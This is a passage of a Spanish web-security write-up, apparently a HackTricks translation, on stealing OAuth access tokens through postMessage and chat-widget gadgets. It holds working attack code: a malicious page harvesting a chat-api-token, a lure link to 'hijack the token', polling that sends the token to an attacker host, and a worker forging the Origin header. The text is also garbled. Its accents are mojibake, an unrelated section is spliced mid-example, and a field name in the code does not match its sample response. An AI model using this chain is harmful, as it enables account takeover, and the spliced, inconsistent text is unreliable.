<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 5 5" width="100%" height="100%" version="1.1">
<script xlink:href="data:application/javascript;base64,dmFyIGJsb2NrTGlzdCA9IFtdOwp2YXIgYWxsb3dMaXN0ID0gW107Ci4uLg=="></script>
</svg>
```
Entonces, podr√≠a utilizar la misma metodolog√≠a que en el ejemplo #1, pero en lugar de insertar el `storage.html` en un iframe, simplemente podr√≠a insertar el SVG con la barra diagonal codificada en la URL:
```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg"
onload="run()"></iframe></div>
```
Dado que ning√∫n sitio web ser√≠a capaz de solucionar esto por s√≠ mismo, envi√© un informe al proveedor de an√°lisis encargado del CDN en su lugar:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

La idea de buscar errores de configuraci√≥n en terceros era principalmente para confirmar que hay m√∫ltiples formas de lograr la filtraci√≥n de tokens y, dado que el tercero ten√≠a un programa de recompensas por errores, esto era solo un receptor diferente para el mismo tipo de error, la diferencia era que el impacto era para todos los clientes del servicio de an√°lisis. En este caso, el cliente del tercero realmente ten√≠a la capacidad de configurar adecuadamente la herramienta para evitar que filtrara datos al atacante. Sin embargo, dado que los datos sensibles a√∫n se enviaban al tercero, era interesante ver si hab√≠a alguna forma de evitar por completo la configuraci√≥n adecuada de la herramienta por parte del cliente.

## **Gadget 3: ejemplo 3, API de chat-widget**

El √∫ltimo ejemplo se bas√≥ en un chat-widget que estaba presente en todas las p√°ginas de un sitio web, incluso en las p√°ginas de error. Hab√≠a varios listeners de postMessage, uno de ellos sin una verificaci√≥n de origen adecuada que solo permit√≠a iniciar la ventana emergente de chat. Otro listener ten√≠a una estricta verificaci√≥n de origen para que el chat-widget recibiera una llamada de inicializaci√≥n y el token de chat-api actual que se usaba para el usuario actual.
```html
<iframe src="https://chat-widget.example.com/chat"></iframe>
<script>
window.addEventListener('message', function(e) {
  if (e.data.type === 'launch-chat') {
    openChat();
  }
});

function openChat() {
  ...
}

var chatApiToken;
window.addEventListener('message', function(e) {
  if (e.origin === 'https://chat-widget.example.com') {
    if (e.data.type === 'chat-widget') {
      if (e.data.key === 'api-token') {
        chatApiToken = e.data.value;
      }
      if(e.data.key === 'init') {
        chatIsLoaded();
      }
    }
  }
});

function chatIsLoaded() {
  ...
}
</script>
```
Cuando se carg√≥ el chat-iframe:

1. Si exist√≠a un chat-api-token en el localStorage del chat-widget, enviar√≠a el api-token a su padre usando postMessage. Si no exist√≠a ning√∫n chat-api-token, no enviar√≠a nada.
2. Cuando el iframe se ha cargado, enviar√° un postMessage con `{"type": "chat-widget", "key": "init"}` a su padre.

Si se hizo clic en el icono de chat en la ventana principal:

1. Si no se hab√≠a enviado ning√∫n chat-api-token, el chat-widget crear√≠a uno y lo pondr√≠a en el localStorage de su propia origen y lo enviar√≠a por postMessage a la ventana principal.
2. La ventana principal har√≠a una llamada API al servicio de chat. El punto final de la API estaba restringido por CORS al sitio web espec√≠fico configurado para el servicio. Ten√≠a que proporcionar un encabezado `Origin` v√°lido para la llamada API con el chat-api-token para permitir que se enviara la solicitud.
3. La llamada API desde la ventana principal contendr√≠a `location.href` y lo registrar√≠a como la "p√°gina actual" del visitante con el chat-api-token. La respuesta luego contendr√≠a tokens para conectarse a un websocket para iniciar la sesi√≥n de chat:

    ```json
    {
      "api_data": {
        "current_page": "https://example.com/#access_token=test",
        "socket_key": "xxxyyyzzz",
        ...
      }
    }
    ```

En este ejemplo, me di cuenta de que el anuncio del chat-api-token siempre se anunciar√≠a al padre del iframe del chat-widget, y si obtuviera el chat-api-token, podr√≠a hacer una solicitud del lado del servidor usando el token y luego agregar mi propio encabezado `Origin` artificial a la llamada API ya que un encabezado CORS solo importa para un navegador. Esto result√≥ en la siguiente cadena:

1. Cre√© una p√°gina maliciosa que incrusta un iframe del chat-widget, agregu√© un listener de postMessage para escuchar el chat-api-token. Adem√°s, activ√© un evento para volver a cargar el iframe si no hab√≠a obtenido el api-token en 2 segundos. Esto fue para asegurarme de que tambi√©n apoyaba a las v√≠ctimas que nunca hab√≠an iniciado el chat, y como pod√≠a activar para abrir el chat de forma remota, primero necesitaba el chat-api-token para comenzar a sondear los datos en el chat-API desde el lado del servidor.

    ```html
    <div id="leak"><iframe
    id="i" name="i"
    src="https://chat-widget.example.com/chat" onload="reloadToCheck()"></iframe></div>
    <script>
    var gotToken = false;
    function reloadToCheck() {
      if (gotToken) return;
      setTimeout(function() {
        document.getElementById('i').src = 'https://chat-widget.example.com/chat?' + Math.random();
      }, 2000);
    }
    window.onmessage = function(e) {
      if (e.data.key === 'api-token') {
        gotToken = true;
        lookInApi(e.data.value);    
      }
    }
    launchChatWindowByPostMessage();
    </script>
    ```
2. Agregu√© un enlace a la p√°gina maliciosa para abrir el flujo de inicio de sesi√≥n que terminar√≠a en la p√°gina con el chat-widget con el token en la URL:

    ```
    <a href="#" onclick="b=window.open('https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...');">Haz clic aqu√≠ para secuestrar el token</a>
    ```
3. La funci√≥n `launchChatWindowByPostMessage()` enviar√° continuamente un postMessage a la ventana principal, si est√° abierta, para lanzar el chat-widget:

    ```javascript
    function launchChatWindowByPostMessage() {
      var launch = setInterval(function() {
        if(b) { b.postMessage({type: 'launch-chat'}, '*'); }
      }, 500);
    }
    ```
4. Cuando la v√≠ctima hizo clic en el enlace y termin√≥ en la p√°gina de error, el chat se lanzar√≠a y se crear√≠a un chat-api-token. Mi recarga del chat-widget iframe en la p√°gina maliciosa obtendr√≠a el `api-token` a trav√©s de postMessage y luego podr√≠a comenzar a buscar en la API la URL actual de la v√≠ctima:

    ```javascript
    function lookInApi(token) {
      var look = setInterval(function() {
        fetch('https://fetch-server-side.attacker.test/?token=' + token).then(e => e.json()).then(e => {
          if (e &&
            e.api_data &&
            e.api_data.current_url &&
            e.api_data.current_url.indexOf('access_token') !== -1) {
              var payload = e.api_data.current_url
              document.getElementById('leak').innerHTML = 'El atacante ahora tiene el token: ' + payload;
              clearInterval(look);
          }
        });
      }, 2000);
    }
    ```
5. La p√°gina del lado del servidor en `https://fetch-server-side.attacker.test/?token=xxx` har√≠a la llamada API con el encabezado Origin agregado para hacer que el Chat-API piense que lo estaba usando como un origen leg√≠timo:

    ```javascript
    addEventListener('fetch', event => {
      event.respondWith(handleRequest(event.request))
    })
    async function getDataFromChatApi(token) {
      return await fetch('https://chat-widget.example.com/api', {headers:{Origin: 'https://example.com', 'Chat-Api-Token': token}});
    }
    function handleRequest(request) {
      const token = request.url.match('token=([^&#]+)')[1] || null;
      return token ? getDataFromChatApi(token) : null;
    }
    ```
6. Cuando la v√≠ctima hizo clic en el enlace y pas√≥ por la danza de OAuth y aterriz√≥ en la p√°gina de error con el token agregado, el chat-widget se abrir√≠a de repente, registrar√≠a la URL actual y el atacante tendr√≠a el token de acceso de la v√≠ctima.

## Otras ideas para filtrar URLs

Todav√≠a hay diferentes tipos de gadgets esperando ser encontrados. Aqu√≠ hay uno de esos casos que no pude encontrar en la naturaleza pero podr√≠a ser una forma potencial de hacer que la URL se filtre usando cualquiera de los modos de respuesta disponibles.

### Una p√°gina en un dominio que enruta cualquier postMessage a su abridor

Dado que todos los tipos de respuesta `web_message` no pueden validar ninguna ruta del origen, cualquier URL en un dominio v√°lido puede recibir el postMessage con el token. Si hay alg√∫n tipo de proxy de listener de postMessage en cualquiera de las p√°ginas en el dominio, que toma cualquier mensaje enviado a √©l y env√≠a todo a su `opener`, puedo hacer una cadena doble de window.open:

P√°gina del atacante 1:
```html
<a href="#" onclick="a=window.open('attacker2.html'); return false;">Accept cookies</a>
```
# P√°gina del atacante 2:

## Happy Paths de OAuth

### XSS, iframes y postMessage para filtrar valores de c√≥digo y estado

Una vez que el usuario ha iniciado sesi√≥n en el proveedor de OAuth y ha sido redirigido de vuelta a la aplicaci√≥n de destino, el proveedor de OAuth enviar√° un c√≥digo de autorizaci√≥n y un estado a la aplicaci√≥n de destino. Estos valores son necesarios para que la aplicaci√≥n de destino obtenga un token de acceso del proveedor de OAuth.

Un atacante puede intentar filtrar estos valores de c√≥digo y estado utilizando t√©cnicas de XSS, iframes y postMessage. El atacante puede crear una p√°gina web maliciosa que incluya un iframe que apunte a la URL de inicio de sesi√≥n del proveedor de OAuth. La p√°gina web maliciosa tambi√©n puede incluir c√≥digo JavaScript que se ejecutar√° en el contexto del iframe.

Cuando el usuario inicia sesi√≥n en el proveedor de OAuth a trav√©s del iframe, el c√≥digo JavaScript malicioso puede leer el valor del c√≥digo de autorizaci√≥n y del estado utilizando la API postMessage. El c√≥digo JavaScript malicioso puede enviar estos valores a un servidor controlado por el atacante para su posterior uso en un ataque de toma de cuenta.

Es importante tener en cuenta que esta t√©cnica solo funcionar√° si el proveedor de OAuth no ha implementado medidas de seguridad adecuadas, como la restricci√≥n de los dominios permitidos para la redirecci√≥n de OAuth.
```html
<a href="#" onclick="b=window.open('https://accounts.google.com/oauth/...?', '', 'x'); location.href = 'https://example.com/postmessage-proxy'; return false;">Login to google</a>
```
Y el `https://example.com/postmessage-proxy` tendr√≠a algo como:
```javascript
// Proxy all my messages to my opener:
window.onmessage=function(e) { opener.postMessage(e.data, '*'); }
```
Podr√≠a utilizar cualquiera de los modos de respuesta `web_message` para enviar el token desde el proveedor de OAuth hasta el origen v√°lido de `https://example.com`, pero el punto final enviar√≠a el token m√°s adelante a `opener`, que es la p√°gina del atacante.

Este flujo puede parecer poco probable y requiere dos clics: uno para crear una relaci√≥n de apertura entre el atacante y el sitio web, y el segundo para lanzar el flujo de OAuth teniendo el sitio leg√≠timo como el abridor de la ventana emergente de OAuth.

El proveedor de OAuth env√≠a el token al origen leg√≠timo:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example1.png)

Y el origen leg√≠timo tiene el proxy de postMessage a su abridor:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example2.png)

Lo que hace que el atacante obtenga el token:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget4-example3.png)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
